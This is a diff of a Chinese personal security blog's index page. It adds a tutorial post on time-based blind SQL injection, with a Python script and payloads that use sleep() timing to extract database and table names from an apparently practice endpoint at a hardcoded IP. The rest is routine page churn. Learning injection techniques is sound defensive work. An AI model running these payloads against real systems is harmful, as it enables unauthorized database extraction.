@@ -41,9 +41,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>30</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
      
@@ -68,6 +68,64 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-sql注入之时间盲注" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/30/sql注入之时间盲注/" class="article-date">
+  <time class="post-time" datetime="2018-04-30T08:37:07.000Z" itemprop="datePublished">
+    <span class="post-month">4月</span><br>
+    <span class="post-day">30</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/30/sql注入之时间盲注/">sql注入之时间盲注</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>上一种注入方式是在虽然没有回显位，但是正确错误的页面有所不同的，那如果正确页面和错误页面都相同呢？我们这是可以使用<strong>第二种注入–延时注入</strong>来判断我们所要的信息。<br>主要用到的是<strong>sleep()函数</strong>如果前面的语句为真，那么sleep()就会调用，页面回显就会有延迟，不过缺点也很明显，如果网络不好的话，报错注入就会出现误报的情况。<br>一般我们使用</p>
+<blockquote>
+<p>if(,1,2)<br>case when() then else end   </p>
+</blockquote>
+<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="/images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="/images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
+<p>爆破出数据库名。接下来的几个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and case when(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;edutest&quot; limit 0,1),1,1)) = 65) then sleep(10) else sleep(0) end --+&quot;</span><br><span class="line">........</span><br></pre></td></tr></table></figure></p>
+<p>之后和上一次的脚本类似，理解一下自己就能去试试爆破出信息来了。</p>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>无力感，什么都做不好，什么都比不过人家，没实力又太骄傲，我可真是个废物。浮躁浮躁，一天都不知道在干些什么，真是糟糕透了。重新学吧，起码要在大二前，拿出一点成绩。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjsyilyfh000unsvjjexes49r" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-sql注入之布尔型注入" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -126,7 +184,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjsk8gf0e000m5cvjx5ipn1sk" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjsyilyf1000knsvjs3hteqqt" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -223,7 +281,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjsk8gf13001f5cvjszig2jvm" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjsyilyfw001dnsvji67d4itn" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -282,7 +340,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjsk8gf1a001m5cvjzd8xsp32" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjsyilygs0021nsvjvstvuw1n" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-shell/">web shell</a></li></ul>
@@ -343,7 +401,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjsk8gezi00095cvjjxxa6chc" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjsyilydq000cnsvj5cpow45i" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-PHP/">Web PHP</a></li></ul>
@@ -394,7 +452,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjsk8gey600015cvjd7itf3y3" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjsyilyfw0017nsvjm80xln6b" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -450,7 +508,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjsk8geyk00035cvjnxndq2n6" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjsyilydb0005nsvj8wyvme5h" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -505,7 +563,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/08/0x02-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjsk8gez300065cvj9mi0w0g2" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/08/0x02-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjsyilycv0001nsvjoya9ixjg" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/">Crypto</a></li></ul>
@@ -563,7 +621,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/0x01-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjsk8gezo000b5cvjg4vmvgfc" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/07/0x01-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjsyilyf1000insvjhics79p3" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/">Crypto</a></li></ul>
@@ -615,7 +673,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/28/0x00 关于搭建博客的一些心得/" data-id="cjsk8gf03000e5cvjwojfoa0l" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/02/28/0x00 关于搭建博客的一些心得/" data-id="cjsyilydb0002nsvjvyvv5svs" class="article-share-link">分享</a>
       
       
     </footer>
@@ -671,9 +729,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>30</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
 
 
@@ -718,8 +776,9 @@
 </div>
 
   
+  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=541131&auto=1&height=66"></iframe>
 </aside>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
+
         
       </div>
       <footer id="footer">
